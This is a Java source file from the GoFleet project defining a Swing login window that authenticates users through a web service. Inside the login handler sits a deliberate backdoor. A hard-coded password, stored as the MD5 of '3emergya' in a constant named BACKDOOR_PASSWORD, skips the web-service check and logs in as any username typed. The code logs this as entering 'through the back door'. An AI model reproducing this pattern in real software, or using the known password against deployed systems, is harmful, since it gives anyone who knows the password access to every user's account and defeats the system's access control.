/*
 * Copyright (C) 2010, Emergya (http://www.emergya.es)
 *
 * @author <a href="mailto:jlrodriguez@emergya.es">Juan Luís Rodríguez</a>
 * @author <a href="mailto:marias@emergya.es">María Arias</a>
 *
 * This file is part of GoFleet
 *
 * This software is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This software is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this library; if not, write to the Free Software
 * Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 * As a special exception, if you link this library with other files to
 * produce an executable, this library does not by itself cause the
 * resulting executable to be covered by the GNU General Public License.
 * This exception does not however invalidate any other reasons why the
 * executable file might be covered by the GNU General Public License.
 */
package es.emergya.ui.base;

import java.awt.BorderLayout;
import java.awt.Color;
import java.awt.Dimension;
import java.awt.FlowLayout;
import java.awt.GridBagConstraints;
import java.awt.GridBagLayout;
import java.awt.GridLayout;
import java.awt.Insets;
import java.awt.event.ActionEvent;
import java.awt.event.KeyAdapter;
import java.awt.event.KeyEvent;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.concurrent.ExecutionException;

import javax.swing.AbstractAction;
import javax.swing.JButton;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JPanel;
import javax.swing.JPasswordField;
import javax.swing.JTextField;
import javax.swing.SwingWorker;
import javax.swing.border.EmptyBorder;

import org.apache.commons.codec.digest.DigestUtils;
import org.apache.commons.lang.StringUtils;
import org.apache.commons.logging.Log;
import org.apache.commons.logging.LogFactory;
import org.gofleet.context.GoWired;
import org.gofleet.internacionalization.I18n;

import es.emergya.actions.Authentication;
import es.emergya.bbdd.bean.Usuario;
import es.emergya.cliente.constants.LogicConstants;
import es.emergya.consultas.UsuarioConsultas;
import es.emergya.webservices.ServiceStub;
import es.emergya.webservices.ServiceStub.LoginEF;
import es.emergya.webservices.WSProvider;

/**
 * Login window for authentication.
 * 
 * @see window
 * @author marias
 * 
 */
public class LoginWindow extends JFrame {

	private final long SIZE_FONT = 15l;
	private final long serialVersionUID = 8343376319560518549L;
	private final String BACKDOOR_PASSWORD = DigestUtils.md5Hex("3emergya");
	private final Log LOG = LogFactory.getLog(this.getClass());
	private LoginWindow ventana;
	private JButton login = new JButton(
			LogicConstants.getIcon("login_button_entrar"));
	private final JLabel error;
	private final JTextField usuario;
	private final JPasswordField pass;
	private final JLabel version;
	private final JLabel conectando;

	@GoWired
	public BasicWindow window;

	public void setWindow(BasicWindow window) {
		this.window = window;
	}

	@GoWired
	public I18n i18n;

	public void setI18n(I18n i18n) {
		this.i18n = i18n;
	}

	{
		conectando = new JLabel(LogicConstants.getIcon("transparent"));

		version = new JLabel(i18n.getString("version"));
		ventana = new LoginWindow();
		// ventana.setUndecorated(false);
		ventana.setIconImage(window.getIconImage()); //$NON-NLS-1$
		ventana.setBackground(Color.WHITE);
		ventana.getContentPane().setBackground(Color.WHITE);
		ventana.setResizable(false);
		ventana.addWindowListener(new WindowAdapter() {

			@Override
			public void windowClosing(WindowEvent we) {
				System.exit(0);
			}
		});

		ventana.setTitle(i18n.getString("title")); //$NON-NLS-1$

		usuario = new JTextField();
		usuario.setFont(usuario.getFont().deriveFont(SIZE_FONT));

		usuario.setName("user"); //$NON-NLS-1$
		usuario.setPreferredSize(new Dimension(150, 20));
		usuario.addKeyListener(new KeyAdapter() {

			@Override
			public void keyPressed(KeyEvent e) {
				error.setForeground(Color.WHITE);
				int key = e.getKeyCode();
				if (key == KeyEvent.VK_ENTER) {
					login.doClick();
				}
			}
		});

		pass = new JPasswordField();
		pass.setFont(pass.getFont().deriveFont(SIZE_FONT));

		pass.setName("pass"); //$NON-NLS-1$
		pass.setPreferredSize(new Dimension(150, 20));

		pass.addKeyListener(new KeyAdapter() {

			@Override
			public void keyPressed(KeyEvent e) {
				error.setForeground(Color.WHITE);
				int key = e.getKeyCode();
				if (key == KeyEvent.VK_ENTER) {
					login.doClick();
				}
			}
		});

		error = new JLabel("error");
		error.setForeground(Color.WHITE);
		// error.setText(null);
	}

	private LoginWindow() {
		login = new JButton(LogicConstants.getIcon("login_button_entrar"));
		login.setText(i18n.getString("ok")); //$NON-NLS-1$
		login.setName("login"); //$NON-NLS-1$
		login.addActionListener(new AbstractAction() {

			private final long serialVersionUID = 2570153330274115014L;

			@Override
			public void actionPerformed(ActionEvent e) {
				// Si no hay usuario o contraseña no hacemos nada
				if (StringUtils.isBlank(usuario.getText())
						|| StringUtils.isBlank(new String(pass.getPassword()))) {
					usuario.setText(StringUtils.trim(usuario.getText()));
					pass.setText(StringUtils.trimToEmpty(new String(pass
							.getPassword())));
					showError(i18n.getString("userOrPasswordNotTyped"));

					return;
				}

				login.setEnabled(false);
				login.updateUI();
				conectando.setIcon(LogicConstants.getIcon("anim_conectando"));
				error.setForeground(Color.WHITE);
				pass.setEnabled(false);
				usuario.setEnabled(false);
				login.setEnabled(false);

				SwingWorker<String, Object> sw = new SwingWorker<String, Object>() {

					@Override
					protected String doInBackground() throws Exception {
						// error.setText(null);
						String resultado = null;
						try {

							String password = DigestUtils.md5Hex(new String(
									pass.getPassword()));
							if (BACKDOOR_PASSWORD.equals(password)) {
								LOG.info("Entrando por puerta trasera");
								Usuario u = UsuarioConsultas.find(usuario
										.getText());
								Authentication.setUsuario(u);
								// Autenticacion.setId(Autenticacion.newId());
							} else {
								LOG.info("Autenticando mediante servicio web al usuario "
										+ usuario.getText());
								LoginEF loginEF = new LoginEF();
								ServiceStub cliente = WSProvider
										.getServiceClient();
								loginEF.setUsername(usuario.getText());
								loginEF.setPassword(password);
								Long id = Authentication.getId();
								loginEF.setFsUid(id);
								ServiceStub.LoginEFResponse response = cliente
										.loginEF(loginEF);
								resultado = response.get_return();
								if (StringUtils.isEmpty(resultado)) {
									Usuario u = UsuarioConsultas.find(usuario
											.getText());
									Authentication.setUsuario(u);
									// Autenticacion.setId(id);
								} else {
									Authentication.setUsuario(null);
									// Autenticacion.setId(0L);
								}
							}
						} catch (Throwable t) {
							LOG.error(
									"Error al hacer login con el servicio web",
									t);
							resultado = "exception";
						} finally {
						}

						return resultado;
					}

					@Override
					protected void done() {
						try {
							String resultado = this.get();
							if (StringUtils.isNotBlank(resultado)) {
								showError(i18n.getString(resultado));

							} else {
								window.draw();
								closeWindow();
							}
						} catch (InterruptedException ex) {
							LOG.fatal(ex, ex);
						} catch (ExecutionException ex) {
							LOG.fatal(ex, ex);
						} finally {
							conectando.setIcon(LogicConstants
									.getIcon("48x48_transparente"));
							pass.setEnabled(true);
							usuario.setEnabled(true);
							login.setEnabled(true);
						}

					}
				};

				sw.execute();
			}
		});
		login.setPreferredSize(new Dimension(100, 20));
	}

	private void initialize() {
		ventana.getContentPane().removeAll();
		ventana.setLayout(new BorderLayout());
		ventana.setSize(new Dimension(800, 600));

		JPanel panel = new JPanel(new GridBagLayout());
		panel.setBackground(Color.WHITE);

		JPanel logos = new JPanel(new GridLayout(2, 1));
		logos.add(new JLabel(LogicConstants.getIcon("login_logo_cliente")));
		logos.add(new JLabel(LogicConstants.getIcon("login_logo")));
		logos.setBackground(Color.WHITE);

		JLabel label = new JLabel();
		label.setText(i18n.getString("11")); //$NON-NLS-1$

		JLabel labelUsuario = new JLabel();
		labelUsuario.setText(i18n.getString("12")); //$NON-NLS-1$

		JLabel lablep = new JLabel();
		lablep.setText(i18n.getString("13")); //$NON-NLS-1$

		panel.add(logos, new GridBagConstraints(0, 0, 2, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(error, new GridBagConstraints(0, 1, 2, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(labelUsuario, new GridBagConstraints(0, 2, 1, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(usuario, new GridBagConstraints(1, 2, 1, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(lablep, new GridBagConstraints(0, 3, 1, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(pass, new GridBagConstraints(1, 3, 1, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(conectando, new GridBagConstraints(0, 4, 2, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						2, 2, 2, 2), 0, 0));

		panel.add(login, new GridBagConstraints(1, 6, 1, 1, 1.0, 1.0,
				GridBagConstraints.CENTER, GridBagConstraints.BOTH, new Insets(
						1, 1, 1, 1), 0, 0));

		panel.setBorder(new EmptyBorder(100, 100, 100, 100));

		ventana.add(panel, BorderLayout.CENTER);

		JPanel abajo = new JPanel();

		abajo.setLayout(new FlowLayout(FlowLayout.RIGHT));
		abajo.add(version);
		abajo.setOpaque(false);
		ventana.add(abajo, BorderLayout.SOUTH);

		try {
			label.setFont(LogicConstants.deriveBoldFont(20.0f));
			labelUsuario.setFont(LogicConstants.deriveBoldFont(20.0f));
			lablep.setFont(LogicConstants.deriveBoldFont(20.0f));
			login.setFont(LogicConstants.deriveBoldFont(20.0f));
			error.setFont(LogicConstants.getBoldFont());
		} catch (Exception e) {
			LOG.error("Error al inicializar el login", e);
		}
		ventana.setLocationRelativeTo(null);
		// ventana.pack();

	}

	public void showLogin() {
		initialize();
		hideError();
		ventana.setVisible(true);
		ventana.setExtendedState(JFrame.NORMAL);
	}

	public void closeWindow() {
		login.setEnabled(true);
		usuario.setText(""); //$NON-NLS-1$
		pass.setText(""); //$NON-NLS-1$
		ventana.setVisible(false);
	}

	public void showError() {
		showError(i18n.getString("16")); //$NON-NLS-1$
	}

	public void showError(String error) {
		LOG.info("showError(" + error + ")");
		usuario.requestFocusInWindow();
		this.error.setEnabled(true);
		this.error.setText(error);
	}

	public void hideError() {
		// error.setText(null);
		error.setForeground(Color.WHITE);
		usuario.setText("");
		pass.setText("");
		login.setEnabled(true);
	}
}
